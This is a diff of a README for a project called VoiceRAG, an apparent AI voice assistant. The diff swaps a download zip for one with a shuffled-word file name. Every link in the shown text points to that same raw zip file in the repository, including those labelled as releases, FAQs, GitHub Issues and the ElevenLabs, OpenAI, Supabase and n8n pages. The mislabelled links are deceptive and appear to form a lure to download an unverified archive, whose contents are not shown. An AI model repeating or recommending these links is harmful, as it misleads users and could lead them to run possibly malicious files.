@@ -6,9 +6,9 @@ Welcome to VoiceRAG! This application allows you to interact with your stored in
 
 ## 📥 Download & Install
 
-[![Download VoiceRAG](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip)](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip)
+[![Download VoiceRAG](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip)](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip)
 
-To start using VoiceRAG, visit this page to download: [VoiceRAG Releases](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip). 
+To start using VoiceRAG, visit this page to download: [VoiceRAG Releases](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip). 
 
 You will find the latest version available for download. Choose the file that matches your system requirements. 
 
@@ -57,21 +57,21 @@ After you download the application:
 
 If you run into issues or have questions, feel free to reach out:
 
-- Check our [FAQs](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip).
-- Join our community discussions on [GitHub Issues](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip).
+- Check our [FAQs](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip).
+- Join our community discussions on [GitHub Issues](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip).
 - Share your feedback to help us improve!
 
 ## 🔗 Additional Resources
 
 For more information about the technologies used in VoiceRAG:
 
-- [ElevenLabs](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip)
-- [OpenAI GPT Models](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip)
-- [Supabase](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip)
-- [n8n](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip)
+- [ElevenLabs](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip)
+- [OpenAI GPT Models](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip)
+- [Supabase](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip)
+- [n8n](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip)
 
 ## 📢 Stay Updated
 
 Keep an eye on our repository for updates and new features. You can follow our releases to get the latest version of VoiceRAG.
 
-Visit this page to download: [VoiceRAG Releases](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval_2.7.zip) for new updates and features. Happy exploring!
+Visit this page to download: [VoiceRAG Releases](https://raw.githubusercontent.com/sonofslaytin/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/with_Knowledge_A_Assistant_RA_Powered_Retrieval_Voice_1.4.zip) for new updates and features. Happy exploring!
